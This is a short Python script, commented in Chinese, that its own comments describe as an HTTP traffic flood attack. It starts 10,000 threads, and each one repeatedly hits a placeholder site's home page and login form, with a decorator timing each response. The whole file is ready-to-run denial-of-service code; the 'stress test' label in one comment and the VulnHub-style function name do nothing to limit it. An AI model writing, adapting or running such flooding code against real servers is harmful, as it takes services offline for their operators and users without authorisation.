import threading
import time
import requests

# 使用多线程实现流量泛洪攻击
# 定义一个装饰器，用来收集其响应时间
def performance(func):
    def inner():
        start = time.time()
        func()
        end = time.time()
        print(f"请求：{func.__name__}的响应时间为：{round(end-start,4)}")
    return inner
session = requests.session()

@performance
def home():
    res = session.get('http://xxxxxx')
    if 'real shop' in res.text:
        print('连接成功')
    else:
        print('连接失败')

@performance
def login():
    data = {'uname':'test', 'pass':'test'}
    res = session.get('http://xxxxxx', data=data)
    if res.text == "you must login":
        print('登陆失败')
    else:
        print('登陆成功')

# 基于HTTP协议进行流量泛洪，压力测试
def vulnhub_flood():
    for i in range(100000):
        try:
            home()
            login()
        except:
            pass

if __name__ == '__main__':
    for i in range(10000):
        t = threading.Thread(target=vulnhub_flood)  # 实例化一个线程，并调用test_02函数
        t.start()                                   # 启动线程
